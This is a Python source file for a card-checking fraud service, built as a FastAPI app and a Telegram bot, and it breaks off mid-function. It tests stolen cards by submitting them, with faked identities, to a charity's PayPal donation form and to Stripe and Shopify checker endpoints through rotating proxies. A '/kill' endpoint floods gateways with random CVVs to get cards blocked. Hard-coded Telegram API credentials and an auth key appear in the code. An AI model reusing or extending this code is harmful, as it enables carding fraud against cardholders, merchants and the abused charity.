#https://strong-production.up.railway.app
import re
import requests
from fake_useragent import UserAgent
from faker import Faker
import json
import random
import time
import asyncio
from datetime import datetime
from fastapi import HTTPException
from pydantic import BaseModel
from typing import Optional
from fastapi import FastAPI
import aiohttp
import traceback
from urllib.parse import quote
import sqlite3
import os
from telethon import Button
from telethon.extensions import html

session = requests.Session()
app = FastAPI()

# Database setup
DB_PATH = "/tmp/mass_check_results.db"

# Track active mass check sessions for stopping
mass_check_events = {}



import aiohttp
import asyncio

STRIPE_APIS = [
    "https://stripe360-production.up.railway.app/stripe_1",
    "https://stripe360-production.up.railway.app/stripe_2",
    "https://stripe360-production.up.railway.app/stripe_3",
    "https://stripe360-production.up.railway.app/stripe_4",
    "https://stripe360-production.up.railway.app/stripe_5",
    "https://stripe360-production.up.railway.app/stripe_6",
    "https://stripe360-production.up.railway.app/stripe_7",
    "https://stripe360-production.up.railway.app/stripe_8",
    "https://stripe360-production.up.railway.app/stripe_9",
]

WORKERS_PER_API = 5

MAX_CONCURRENT = len(STRIPE_APIS) * WORKERS_PER_API

semaphore = asyncio.Semaphore(MAX_CONCURRENT)



def init_db():
    """Initialize SQLite database for storing mass check results"""
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS mass_checks
                 (id INTEGER PRIMARY KEY, user_id INTEGER, gate TEXT, charged TEXT, approved TEXT, declined TEXT, errors TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)''')
    c.execute('''CREATE TABLE IF NOT EXISTS check_sessions
                 (session_id TEXT PRIMARY KEY, user_id INTEGER, gate TEXT, total_cards INTEGER, checked INTEGER, charged_count INTEGER, approved_count INTEGER, declined_count INTEGER, error_count INTEGER, message_id INTEGER)''')
    conn.commit()
    conn.close()

init_db()

def save_result(user_id, gate, result_type, card_info):
    """Save individual card result to database"""
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute(f'INSERT INTO mass_checks (user_id, gate, {result_type}) VALUES (?, ?, ?)',
              (user_id, gate, card_info))
    conn.commit()
    conn.close()

def get_session_results(session_id):
    """Get all results for a session"""
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('SELECT charged, approved, declined, errors FROM mass_checks WHERE session_id = ?', (session_id,))
    conn.close()

def cleanup_session(session_id):
    """Clean up database after sending results to user"""
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('DELETE FROM mass_checks WHERE session_id = ?', (session_id,))
    conn.commit()
    conn.close()

Z = '\033[1;31m'
F = '\033[2;32m'
GRAY = '\033[1;30m'
ORANGE = '\033[38;5;208m'
RESET = '\033[0m'

# Uncommon names to randomize
UNCOMMON_FIRST_NAMES = [
    "Ezra", "Silas", "Thaddeus", "Leander", "Cornelius", "Beauregard", "Percival",
    "Matthias", "Augustine", "Octavius", "Caspian", "Orson", "Merrick", "Dashiell",
    "Alistair", "Bowen", "Casimir", "Dexter", "Emerson", "Flemming", "Gideon",
    "Henryk", "Ignatius", "Jasper", "Klaus", "Leroy", "Maverick", "Nolan",
    "Oberon", "Phineas", "Quincy", "Rasmus", "Seamus", "Theron", "Ulysses",
    "Valentino", "Wolfgang", "Xander", "Yarrow", "Zephyr", "Aileron", "Brodrick",
    "Calloway", "Darby", "Edison", "Finley", "Gaston", "Hadrian", "Isidore"
]

UNCOMMON_LAST_NAMES = [
    "Wickham", "Ashford", "Whitmore", "Pembroke", "Blackwell", "Thornton", "Beaumont",
    "Cheltenham", "Dalrymple", "Etheridge", "Fairfax", "Grayson", "Harrington", "Iverson",
    "Jamison", "Kensington", "Lockwood", "Mansfield", "Northwick", "Osborne", "Prescott",
    "Queensbury", "Ridgeway", "Somerfield", "Talmadge", "Underwood", "Vanderbilt", "Westbrook",
    "Xanthippe", "Yarborough", "Zelinski", "Ashby", "Blakeley", "Cromwell", "Dalton",
    "Elmsworth", "Foxworth", "Gainsborough", "Hackett", "Ingersoll", "Jocelyn", "Keaton"
]

# Rate limiter - track user check times (user_id: timestamp)
user_check_times = {}
RATE_LIMIT_SECONDS = 15  # Minimum 5 seconds between checks per user


# Request/Response Models
class CardRequest(BaseModel):
    num: str
    mon: str
    yer: str
    cvc: str

class CheckResponse(BaseModel):
    card_number: str
    status: str
    message: str
    details: Optional[dict] = None

# Queue to handle concurrent requests without overlapping
check_queue = asyncio.Queue()
MAX_CONCURRENT = 1  # Process one card at a time to avoid overlapping

def generate_random_email(fake=None):
    """Generate random email with numbers to avoid account restrictions"""
    first_part = get_uncommon_first_name().lower() + str(random.randint(100000, 999999))
    second_part = get_uncommon_last_name().lower() + str(random.randint(10000, 99999))
    third_part = str(random.randint(100000, 999999))
    domains = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "protonmail.com", "mail.com", "icloud.com", "aol.com", "tutanota.com"]
    domain = random.choice(domains)
    return f"{first_part}_{second_part}_{third_part}@{domain}"

def get_uncommon_first_name():
    """Get random uncommon first name"""
    return random.choice(UNCOMMON_FIRST_NAMES)

def get_uncommon_last_name():
    """Get random uncommon last name"""
    return random.choice(UNCOMMON_LAST_NAMES)

def info_requests():
    us = UserAgent().random
    r = requests.Session()
    fake = Faker()
    return us, r, fake

def var_response_msg(us, r):
    url = "https://www.brightercommunities.org/donate-form/"
    headers = {'User-Agent': us}
    
    try:
        response = r.get(url, headers=headers, timeout=10)
        hash = re.findall(r'(?<=name="give-form-hash" value=").*?(?=")', response.text)[0]
        form_id = re.findall(r'(?<=name="give-form-id" value=").*?(?=")', response.text)[0]
        prefix = re.findall(r'(?<=name="give-form-id-prefix" value=").*?(?=")', response.text)[0]
        
        if not hash or not form_id or not prefix:
            return None, None, None
        return hash, form_id, prefix
    except Exception as e:
        print(f"Error in var_response_msg: {e}")
        return None, None, None

def requests_id(us, r, fake, hash, form_id, prefix):
    url = "https://www.brightercommunities.org/wp-admin/admin-ajax.php?action=give_paypal_commerce_create_order"
    
    payload = {
        'give-form-id-prefix': prefix,
        'give-form-id': form_id,
        'give-form-minimum': '5.00',
        'give-form-hash': hash,
        'give-amount': '5.00',
        'give_first': get_uncommon_first_name(),
        'give_last': get_uncommon_last_name(),
        'give_email': generate_random_email(fake)
    }
    
    headers = {'User-Agent': us}
    
    try:
        response = r.post(url, data=payload, headers=headers, timeout=10)
        id = response.json()["data"]["id"]
        return id
    except Exception as e:
        print(f"Error in requests_id: {e}")
        return None

def info_cards(card):
    c = card["num"]
    info_card = {
        '3': 'JCB',
        '4': 'VISA',
        '5': 'MASTER_CARD',
        '6': 'DISCOVER'
    }.get(c[0], "Unknown card type")
    return info_card

def response_msg(card, us, r, fake, id, info_card):
    url = "https://www.paypal.com/graphql?fetch_credit_form_submit="
    
    payload = {
        "query": "\n        mutation payWithCard(\n            $token: String!\n            $card: CardInput\n            $paymentToken: String\n            $phoneNumber: String\n            $firstName: String\n            $lastName: String\n            $shippingAddress: AddressInput\n            $billingAddress: AddressInput\n            $email: String\n            $currencyConversionType: CheckoutCurrencyConversionType\n            $installmentTerm: Int\n            $identityDocument: IdentityDocumentInput\n            $feeReferenceId: String\n        ) {\n            approveGuestPaymentWithCreditCard(\n                token: $token\n                card: $card\n                paymentToken: $paymentToken\n                phoneNumber: $phoneNumber\n                firstName: $firstName\n                lastName: $lastName\n                email: $email\n                shippingAddress: $shippingAddress\n                billingAddress: $billingAddress\n                currencyConversionType: $currencyConversionType\n                installmentTerm: $installmentTerm\n                identityDocument: $identityDocument\n                feeReferenceId: $feeReferenceId\n            ) {\n                flags {\n                    is3DSecureRequired\n                }\n                cart {\n                    intent\n                    cartId\n                    buyer {\n                        userId\n                        auth {\n                            accessToken\n                        }\n                    }\n                    returnUrl {\n                        href\n                    }\n                }\n                paymentContingencies {\n                    threeDomainSecure {\n                        status\n                        method\n                        redirectUrl {\n                            href\n                        }\n                        parameter\n                    }\n                }\n            }\n        }\n        ",
        "variables": {
            "token": id,
            "card": {
                "cardNumber": card["num"],
                "type": info_card,
                "expirationDate": card["mon"] + '/20' + card["yer"],
                "postalCode": fake.zipcode(),
                "securityCode": card["cvc"],
            },
            "phoneNumber": fake.phone_number(),
            "firstName": get_uncommon_first_name(),
            "lastName": get_uncommon_last_name(),
            "billingAddress": {
                "givenName": get_uncommon_first_name(),
                "familyName": get_uncommon_last_name(),
                "country": "US",
                "line1": fake.street_address(),
                "line2": "",
                "city": fake.city(),
                "state": fake.state_abbr(),
                "postalCode": fake.zipcode(),
            },
            "shippingAddress": {
                "givenName": get_uncommon_first_name(),
                "familyName": get_uncommon_last_name(),
                "country": "US",
                "line1": fake.street_address(),
                "line2": "",
                "city": fake.city(),
                "state": fake.state_abbr(),
                "postalCode": fake.zipcode(),
            },
            "email": generate_random_email(fake),
            "currencyConversionType": "PAYPAL"
        },
        "operationName": None
    }
    
    headers = {'User-Agent': us, 'Content-Type': "application/json"}
    
    try:
        response = requests.post(url, data=json.dumps(payload), headers=headers, timeout=10)
        time.sleep(random.randint(2, 5))
        return response.text
    except Exception as e:
        print(f"Error in response_msg: {e}")
        return str(e)

def parse_response(card, text_paypal, fake):
    card_info = f"{card['num']}|{card['mon']}|{card['yer']}|{card['cvc']}"
    
    if "accessToken" in text_paypal or "cartId" in text_paypal:
        status = "CHARGED"
        msg = "𝗖𝗵𝗮𝗿𝗴𝗲𝗱 5.00$ ❇️"
    elif "INVALID_SECURITY_CODE" in text_paypal:
        status = "CVV_FAILURE"
        msg = "CVV2_FAILURE! ❇️"
    elif "GRAPHQL_VALIDATION_FAILED" in text_paypal:
        status = "VALIDATION_FAILED"
        msg = "GRAPHQL_VALIDATION_FAILED"
    elif "EXISTING_ACCOUNT_RESTRICTED" in text_paypal:
        status = "ACCOUNT_RESTRICTED"
        msg = "EXISTING ACCOUNT RESTRICTED!"
    elif "RISK_DISALLOWED" in text_paypal:
        status = "RISK_DISALLOWED"
        msg = "RISK_DISALLOWED"
    elif "ISSUER_DATA_NOT_FOUND" in text_paypal:
        status = "DATA_NOT_FOUND"
        msg = "ISSUER_DATA_NOT_FOUND"
    elif "INVALID_BILLING_ADDRESS" in text_paypal:
        status = "INSUFFICIENT_FUNDS"
        msg = "INSUFFICIENT_FUNDS! ❇️"
    elif "R_ERROR" in text_paypal:
        status = "GENERIC_ERROR"
        msg = "CARD_GENERIC_ERROR"
    elif "ISSUER_DECLINE" in text_paypal:
        status = "ISSUER_DECLINE"
        msg = "ISSUER_DECLINE"
    elif "EXPIRED_CARD" in text_paypal:
        status = "EXPIRED"
        msg = "EXPIRED_CARD"
    elif "LOGIN_ERROR" in text_paypal:
        status = "LOGIN_ERROR"
        msg = "LOGIN_ERROR"
    elif "VALIDATION_ERROR" in text_paypal:
        status = "VALIDATION_ERROR"
        msg = "VALIDATION_ERROR"
    else:
        status = "UNKNOWN"
        msg = text_paypal[:100]
    
    return {
        "card_number": card_info,
        "status": status,
        "message": msg,
        "details": {
            "first_name": get_uncommon_first_name(),
            "last_name": get_uncommon_last_name(),
            "email": generate_random_email(fake),
            "timestamp": datetime.now().isoformat()
        }
    }

async def check_card_paypal(card: dict):
    """Process a single card check"""
    try:
        time.sleep(random.randint(1, 3))
        
        us, r, fake = info_requests()
        hash, form_id, prefix = var_response_msg(us, r)
        
        if not hash or not form_id or not prefix:
            return {
                "card_number": f"{card['num']}|{card['mon']}|{card['yer']}|{card['cvc']}",
                "status": "FAILED",
                "message": "Could not retrieve form data"
            }
        
        id = requests_id(us, r, fake, hash, form_id, prefix)
        
        if not id:
            return {
                "card_number": f"{card['num']}|{card['mon']}|{card['yer']}|{card['cvc']}",
                "status": "FAILED",
                "message": "Could not retrieve payment token"
            }
        
        info_card = info_cards(card)
        text_paypal = response_msg(card, us, r, fake, id, info_card)
        
        result = parse_response(card, text_paypal, fake)
        return result
    
    except Exception as e:
        return {
            "card_number": f"{card['num']}|{card['mon']}|{card['yer']}|{card['cvc']}",
            "status": "ERROR",
            "message": str(e)
        }




# API Endpoints
@app.get("/paypal", response_model=CheckResponse)
async def paypal_single(card: CardRequest):
    """Check a single card - processes sequentially to avoid overlapping"""
    try:
        result = await check_card_paypal(card.model_dump())
        return CheckResponse(**result)
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/paypal_mass")
async def paypal_check_batch(cards: list[CardRequest]):
    """Check multiple cards - queued to process without overlapping"""
    results = []
    
    for card in cards:
        result = await check_card_paypal(card.model_dump())
        results.append(result)
        time.sleep(random.randint(6, 10))  # Delay between checks
    
    return {
        "total": len(cards),
        "results": results,
        "timestamp": datetime.now().isoformat()
    }

@app.get("/health")
async def health():
    """Health check endpoint"""
    return {
        "status": "healthy",
        "timestamp": datetime.now().isoformat()
    }

@app.get("/")
async def root():
    """API information"""
    return {
        "name": "Card Checker API",
        "version": "1.0.0",
        "endpoints": {
            "check": "GET /paypal - Check a single card",
            "killer": "GET /kill",
            "check_batch": "GET /paypal_mass - Check multiple cards",
            "health": "GET /health - Health check",
            "docs": "GET /docs - Interactive API documentation"
        }
    }





killed = 0

dead_card = {}

from typing import List



@app.get("/kill")
async def kill(cc: str):

    global killed

    num, mm, yy, cvv = cc.split("|")

    result = await kill_card(num, mm, yy, cvv)

    if not result:
        return {
            "card": cc,
            "status": "failed",
            "response": "No Decline Found",
            "message": "No API returned decline.",
            "total_killed": killed
        }

    return result



async def kill_card(num: str, mm: str, yy: str, cvv: str):

    api_template_01 = f'https://stripe360-production.up.railway.app/stripe_1?auth=WTFH4RSH&cc='

    api_template_02 = f'https://stripe360-production.up.railway.app/stripe_2?auth=WTFH4RSH&cc='

    api_template_03 = f'https://stripe360-production.up.railway.app/stripe_3?auth=WTFH4RSH&cc='

    api_template_04 = f'https://autoshopify-production-d008.up.railway.app/shopify?site=https://keyesco.myshopify.com&cc='

    api_template_05 = f'https://haters.cxchk.site/shopii?site=https://keyesco.myshopify.com&cc='

    api_template_08 = f'https://stripe360-production.up.railway.app/stripe_4?auth=WTFH4RSH&cc='

    api_template_09 = f'https://stripe360-production.up.railway.app/stripe_5?auth=WTFH4RSH&cc='

    api_template_10 = f'https://stripe360-production.up.railway.app/stripe_6?auth=WTFH4RSH&cc='

    api_template_11 = f'https://stripe360-production.up.railway.app/stripe_7?auth=WTFH4RSH&cc='

    api_template_12 = f'https://stripe360-production.up.railway.app/stripe_8?auth=WTFH4RSH&cc='

    api_template_13 = f'https://stripe360-production.up.railway.app/stripe_9?auth=WTFH4RSH&cc='




    global killed

    api_templates = [
        api_template_01,
        api_template_02,
        api_template_03,
        api_template_04,
        api_template_05,
        api_template_08,
        api_template_09,
        api_template_10,
        api_template_11,
        api_template_12,
        api_template_13
    ]

    original_card = f"{num}|{mm}|{yy}|{cvv}"

    connector = aiohttp.TCPConnector(
        limit=100,
        ttl_dns_cache=300,
        ssl=False
    )

    timeout = aiohttp.ClientTimeout(total=20)  # Individual request timeout

    lock = asyncio.Lock()
    start_time = time.time()
    kill_duration = 20  # 20 seconds

    result = {
        "card": original_card,
        "status": "success",
        "response": "Card Killed",
        "message": "Card has been killed successfully.",
        "total_killed": 0
    }

    async def spam_api(session, api_template):
        """Continuously spam API for 20 seconds"""
        while time.time() - start_time < kill_duration:
            try:
                random_cvv = random.randint(100, 999)

                card_with_cvv = f"{num}|{mm}|{yy}|{random_cvv}"

                api_url = f"{api_template}{quote(card_with_cvv, safe='')}"

                if "razorpay.me" in api_url:
                    api_url += "&site=https://razorpay.me/@holidaymoodsadventure&proxy="

                async with session.get(api_url) as response:

                    text = await response.text()

                    print(f"[{response.status}] {api_url}")

            except asyncio.TimeoutError:
                print(f"[TIMEOUT] {api_template}")
                await asyncio.sleep(0.1)

            except aiohttp.ClientError as e:
                print(f"[AIOHTTP ERROR] {api_template} -> {e}")
                await asyncio.sleep(0.1)

            except Exception:
                print(f"[UNKNOWN ERROR] {api_template}")
                await asyncio.sleep(0.1)

                        


    async with aiohttp.ClientSession(
        connector=connector,
        timeout=timeout
    ) as session:

        tasks = [
            asyncio.create_task(spam_api(session, api))
            for api in api_templates
        ]

        await asyncio.gather(*tasks)

    async with lock:
        global killed
        killed += 1
        result["total_killed"] = killed
        print(f"[KILLED] {original_card}")

    return result
    




import requests; session = requests.Session()
from telethon import TelegramClient, events, Button
import asyncio
import aiohttp
import aiofiles
import os
import random
import time
import json
import re
from datetime import datetime
# Direct API endpoint (replaces checker_bridge)
CHECKER_API_URL = 'https://autoshopify-production-e4f6.up.railway.app/shopify'

KILLER_API = 'http://0.0.0.0:8000'
OWNER_ID = 6127646960

PREMIUM_EMOJI_IDS = {
    "✅": "6023660820544623088",   # ✨ Multi Sparkles / Celebration
    "🔥": "5999340396432333728",   # 🔥 Purple Flame Heart
    "❌": "6037570896766438989",   # 💀 White Skull (Dark Glow)
    "⚡": "6026367225466720832",   # ⚡ Yellow Lightning Bolt
    "💳": "5971944878815317190",   # 💫 Floating Color Dots
    "💠": "5971837723676249096",   # 🌀 Neon Circle Rings
    "📝": "6023660820544623088",   # ✨
    "🌐": "6026367225466720832",   # ⚡
    "🎯": "5974235702701853774",   # 🟠🟡🟢 Triple Ring Loader
    "🤖": "6057466460886799210",   # 😼 Dark Cat Face
    "🤵": "4949560993840629085",   # 🧠 Golden Maze
    "💰": "5971944878815317190",   # 💫
    "⏸️": "6001440193058444284",   # ⚙️ Arc Reactor
    "▶️": "6285315214673975495",   # ➡️ Neon Arrow Right
    "🛑": "5420323339723881652",   # ⚠️ Red Warning Triangle
    "📊": "5971837723676249096",   # 🌀
    "📦": "6066395745139824604",   # 🎀 Neon Pink Bow
    "📋": "5974235702701853774",   # Triple Ring
    "🔄": "5971837723676249096",   # 🌀 Neon Circle Rings
    "⏳": "5971837723676249096",   # 🌀
    "🚀": "6282977077427702833",   # 🎉 Color Confetti
    "⚠️": "5420323339723881652",   # ⚠️ Red Warning Triangle
    "💎": "6023660820544623088",   # ✨
}
    



def premium_emoji(text):
    """Replace Unicode emojis with <tg-emoji emoji-id="..."> for Premium custom emojis.
    Requires a Telethon/parser that supports <tg-emoji emoji-id="ID"> in HTML (e.g. Telethon 2.x or custom parser).
    Bot must be created with a Telegram Premium account for custom emojis to send."""
    if not text:
        return text
    # Use placeholders to avoid replacing the same emoji inside tags again
    placeholders = []
    result = text
    for i, (emoji, doc_id) in enumerate(PREMIUM_EMOJI_IDS.items()):
        placeholder = f"\x00PE{i:02d}\x00"
        placeholders.append((placeholder, doc_id, emoji))
        result = result.replace(emoji, placeholder)
    for placeholder, doc_id, emoji in placeholders:
        result = result.replace(placeholder, f'<tg-emoji emoji-id="{doc_id}">{emoji}</tg-emoji>')
    return result

# Bot Configuration
API_ID = 21124241
API_HASH = 'b7ddce3d3683f54be788fddae73fa468'
BOT_TOKEN = os.getenv('BOT_TOKEN')


# File paths
PREMIUM_FILE = 'premium.txt'
SITES_FILE = 'sites.txt'
PROXY_FILE = 'proxy.txt'

# Initialize bot
bot = TelegramClient('checker_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# Store active checking sessions
active_sessions = {}

# Dead site error keywords
_DEAD_INDICATORS = (
    'receipt id is empty', 'handle is empty', 'product id is empty',
    'tax amount is empty', 'payment method identifier is empty',
    'invalid url', 'error in 1st req', 'error in 1 req',
    'cloudflare', 'connection failed', 'timed out',
    'access denied', 'tlsv1 alert', 'ssl routines',
    'could not resolve', 'domain name not found',
    'name or service not known', 'openssl ssl_connect',
    'empty reply from server', 'httperror504', 'http error',
    'timeout', 'unreachable', 'ssl error',
    '502', '503', '504', 'bad gateway', 'service unavailable',
    'gateway timeout', 'network error', 'connection reset',
    'failed to detect product', 'failed to create checkout',
    'failed to tokenize card', 'failed to get proposal data',
    'submit rejected', 'submit rejected:','handle error', 'http 404',
    'delivery_delivery_line_detail_changed', 'delivery_address2_required',
    'url rejected', 'malformed input', 'amount_too_small', 'amount too small',
    'site dead', 'captcha_required', 'captcha required', 'site errors', 'failed',
    'all products sold out', 'no_session_token', 'tokenize_fail',
)
# --- UPDATED LOADING FUNCTIONS ---
def get_file_lines(filepath):
    """Helper to read lines from a file fresh every time"""
    if not os.path.exists(filepath):
        return []
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"Error reading {filepath}: {e}")
        return []

def load_premium_users():
    return get_file_lines(PREMIUM_FILE)

def load_sites():
    return get_file_lines(SITES_FILE)

def load_proxies():
    return get_file_lines(PROXY_FILE)

def is_premium(user_id):
    """Check if user is premium - Reads file fresh every check"""
    premium_users = load_premium_users()
    return str(user_id) in premium_users

def extract_cc(text):
    """Extract CC from text in format: card|month|year|cvv"""
    pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
    matches = re.findall(pattern, text)
    cards = []
    for match in matches:
        card, month, year, cvv = match
        if len(year) == 2:
            year = '20' + year
        cards.append(f"{card}|{month}|{year}|{cvv}")
    return cards

def is_dead_site_error(error_msg):
    """Check if error indicates dead site"""
    if not error_msg:
        return True
    error_lower = str(error_msg).lower()
    return any(keyword in error_lower for keyword in _DEAD_INDICATORS)

async def get_bin_info(card_number):
    """Get BIN info from API"""
    try:
        bin_number = card_number[:6]
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f'https://bins.antipublic.cc/bins/{bin_number}') as res:
                if res.status != 200:
                    return 'BIN Info Not Found', '-', '-', '-', '-', ''
                response_text = await res.text()
                try:
                    data = json.loads(response_text)
                    brand = data.get('brand', '-')
                    bin_type = data.get('type', '-')
                    level = data.get('level', '-')
                    bank = data.get('bank', '-')
                    country = data.get('country_name', '-')
                    flag = data.get('country_flag', '')
                    return brand, bin_type, level, bank, country, flag
                except json.JSONDecodeError:
                    return '-', '-', '-', '-', '-', ''
    except Exception:
        return '-', '-', '-', '-', '-', ''




# GLOBAL SHARED SESSION
session = None

async def create_session():

    global session

    if session and not session.closed:
        return session

    connector = aiohttp.TCPConnector(
        limit=0,
        limit_per_host=0,
        ttl_dns_cache=300,
        ssl=False,
        force_close=False,
        enable_cleanup_closed=True
    )

    timeout = aiohttp.ClientTimeout(
        total=15,
        connect=10,
        sock_read=15
    )

    session = aiohttp.ClientSession(
        connector=connector,
        timeout=timeout,
        raise_for_status=False
    )

    return session

async def check_card(card, site, proxy):


    session = await create_session()

    try:

        if len(card.split('|')) != 4:

            return {
                'status': 'Invalid Format',
                'message': 'Invalid card format',
                'card': card
            }

        params = {
            'cards': [
                {
                    'cc': card,
                    'site': site,
                    'proxy': proxy
                }
            ]
        }

        async with session.post(
            CHECKER_API_URL,
            json=params
        ) as resp:

            try:

                raw = await resp.json(
                    content_type=None
                )

            except Exception:

                text = await resp.text()

                return {
                    'status': 'Dead',
                    'message': f'Invalid JSON: {text[:300]}',
                    'card': card,
                    'gateway': 'Unknown',
                    'price': '-'
                }

        response_msg = str(
            raw.get('Response', '')
        )

        response_lower = response_msg.lower()

        price = raw.get('Price', '-')

        gate = raw.get('Gate', 'shopiii')

        status = raw.get('Status', '')

        # RETRYABLE ERRORS
        retry_keywords = [
            'cloudflare bypass failed',
            'timeout',
            '502',
            '504',
            '429',
            'gateway timeout',
            'proxy error',
            'connection failed'
        ]

        if (
            is_dead_site_error(response_msg)
            or any(
                key in response_lower
                for key in retry_keywords
            )
        ):

            return {
                'status': 'Site Error',
                'message': response_msg,
                'card': card,
                'retry': True,
                'gateway': gate,
                'price': price
            }

        # CHARGED
        charged_keywords = [
            'order completed',
            'thank you',
            'payment successful'
        ]

        if (
            status == 'Charged'
            or '💎' in response_msg
            or any(
                key in response_lower
                for key in charged_keywords
            )
        ):

            return {
                'status': 'Charged',
                'message': response_msg,
                'card': card,
                'site': site,
                'gateway': gate,
                'price': price
            }

        # APPROVED
        approved_keywords = [
            'approved',
            'success',
            'insufficient_funds',
            'insufficient funds',
            'invalid_cvv',
            'incorrect_cvv',
            'invalid_cvc',
            'incorrect_cvc',
            'invalid cvv',
            'incorrect cvv',
            'invalid cvc',
            'incorrect cvc',
            'incorrect_zip',
            'incorrect zip'
        ]

        if (
            status == 'Approved'
            or any(
                key in response_lower
                for key in approved_keywords
            )
        ):

            return {
                'status': 'Approved',
                'message': response_msg,
                'card': card,
                'site': site,
                'gateway': gate,
                'price': price
            }

        return {
            'status': 'Dead',
            'message': response_msg,
            'card': card,
            'site': site,
            'gateway': gate,
            'price': price
        }

    except asyncio.TimeoutError:

        return {
            'status': 'Site Error',
            'message': 'Request timeout',
            'card': card,
            'retry': True
        }

    except Exception as e:

        error_msg = str(e)

        return {
            'status': 'Dead',
            'message': error_msg,
            'card': card,
            'gateway': 'Unknown',
            'price': '-'
        }





# =========================
# HIGH PERFORMANCE CHECKER
# =========================

import aiohttp
import asyncio
import random
import time
from collections import deque

# =========================
# CONFIG
# =========================

WORKERS = 5

BATCH_SIZE = 5

MAX_RETRIES = 2

TIMEOUT = 30

EDIT_EVERY = 20

# =========================
# GLOBAL SESSION
# =========================

session = None

connector = None


async def get_session():

    global session
    global connector

    if session and not session.closed:
        return session

    connector = aiohttp.TCPConnector(
        limit=0,
        limit_per_host=0,
        ttl_dns_cache=300,
        ssl=False,
        force_close=False,
        enable_cleanup_closed=True
    )

    timeout = aiohttp.ClientTimeout(
        total=TIMEOUT
    )

    session = aiohttp.ClientSession(
        connector=connector,
        timeout=timeout,
        raise_for_status=False
    )

    return session


# =========================
# SMART PROXY MANAGER
# =========================

proxy_pool = deque()

proxy_stats = {}


def load_proxy_pool(proxies):

    proxy_pool.clear()

    for proxy in proxies:

        proxy_pool.append(proxy)

        proxy_stats[proxy] = {
            "fails": 0,
            "success": 0,
            "cooldown": 0
        }


def get_proxy():

    for _ in range(len(proxy_pool)):

        proxy = proxy_pool[0]

        proxy_pool.rotate(-1)

        stats = proxy_stats[proxy]

        if time.time() >= stats["cooldown"]:
            return proxy

    return random.choice(list(proxy_pool))


def mark_proxy_good(proxy):

    if proxy in proxy_stats:

        proxy_stats[proxy]["success"] += 1

        proxy_stats[proxy]["fails"] = 0


def mark_proxy_bad(proxy):

    if proxy in proxy_stats:

        proxy_stats[proxy]["fails"] += 1

        fails = proxy_stats[proxy]["fails"]

        if fails >= 3:

            proxy_stats[proxy]["cooldown"] = (
                time.time() + 60
            )


# =========================
# SMART SITE MANAGER
# =========================

site_pool = deque()

site_stats = {}


def load_site_pool(sites):

    site_pool.clear()

    for site in sites:

        site_pool.append(site)

        site_stats[site] = {
            "fails": 0,
            "success": 0,
            "cooldown": 0
        }


def get_site():

    for _ in range(len(site_pool)):

        site = site_pool[0]

        site_pool.rotate(-1)

        stats = site_stats[site]

        if time.time() >= stats["cooldown"]:
            return site

    return random.choice(list(site_pool))


def mark_site_good(site):

    if site in site_stats:

        site_stats[site]["success"] += 1

        site_stats[site]["fails"] = 0


def mark_site_bad(site):

    if site in site_stats:

        site_stats[site]["fails"] += 1

        fails = site_stats[site]["fails"]

        if fails >= 3:

            site_stats[site]["cooldown"] = (
                time.time() + 60
            )


# =========================
# BATCH CHECKER
# =========================

async def check_batch(batch):

    session = await get_session()

    # Convert raw cards into backend format
    formatted_cards = []

    for item in batch:

        formatted_cards.append({
            "cc": item["cc"],
            "site": item["site"],
            "proxy": item.get("proxy")
        })

    payload = {
        "cards": formatted_cards
    }

    print(f"Sending request with payload: {payload}")

    async with session.post(
        f"{CHECKER_API_URL}/batch",
        json=payload
    ) as resp:
        
        with open('last_response.txt', 'w', encoding='utf-8') as f:
            f.write(f"Status: {resp.status}\n")
            f.write("Headers:\n")
            for key, value in resp.headers.items():
                f.write(f"{key}: {value}\n")
            f.write("\nResponse Body:\n")

        response_text = await resp.text()

        print(f"Status: {resp.status}")
        print(f"Response: {response_text[:1000]}")

        if (
            'Site requires login!' in response_text
            or 'Site not supported' in response_text
            or 'Site Error!' in response_text
        ):

            with open('sites.txt', 'r') as f:
                sites = f.readlines()

            with open('sites.txt', 'w') as f:

                for s in sites:

                    if s.strip() != item["site"]:
                        f.write(s)

            print(f"Removed bad site: {item['site']}")

        try:

            return await resp.json(
                content_type=None
            )

        except Exception as e:

            print(f"JSON ERROR: {e}")

            return {
                "results": []
            }


# =========================
# PARALLEL RETRY
# =========================

async def check_card_with_retry(
    card,
    max_retries=MAX_RETRIES
):

    attempts = []

    for _ in range(max_retries):

        site = get_site()

        proxy = get_proxy()

        attempts.append({
            "cc": card,
            "site": site,
            "proxy": proxy
        })

    try:

        results = await check_batch(
            attempts
        )


        if "results" not in results:

            return {
                'status': 'Dead',
                'message': 'Invalid backend response',
                'card': card
            }

        for result in results["results"]:

            response = str(
                result.get("Response", "")
            ).lower()

            status = str(
                result.get("Status", "")
            )

            site = result.get("site")

            proxy = result.get("proxy")

            # SUCCESS
            if (
                status == "Charged"
                or status == "Approved"
            ):

                mark_site_good(site)

                mark_proxy_good(proxy)

                return {
                    'status': status,
                    'message': result.get(
                        "Response",
                        ""
                    ),
                    'card': card,
                    'gateway': result.get(
                        "Gateway",
                        "Unknown"
                    ),
                    'price': result.get(
                        "Price",
                        "-"
                    ),
                    'site': site
                }

            retry_keywords = [
                'cloudflare',
                'timeout',
                'proxy error',
                'gateway timeout',
                '429',
                '502',
                '504'
            ]

            if any(
                x in response
                for x in retry_keywords
            ):

                mark_site_bad(site)

                mark_proxy_bad(proxy)

                continue

            return {
                'status': 'Dead',
                'message': result.get(
                    "Response",
                    ""
                ),
                'card': card,
                'gateway': result.get(
                    "Gateway",
                    "Unknown"
                ),
                'price': result.get(
                    "Price",
                    "-"
                ),
                'site': site
            }

    except Exception as e:

        return {
            'status': 'Dead',
            'message': str(e),
            'card': card,
            'gateway': 'Unknown',
            'price': '-'
        }

    return {
        'status': 'Dead',
        'message': 'Retries exhausted',
        'card': card,
        'gateway': 'Unknown',
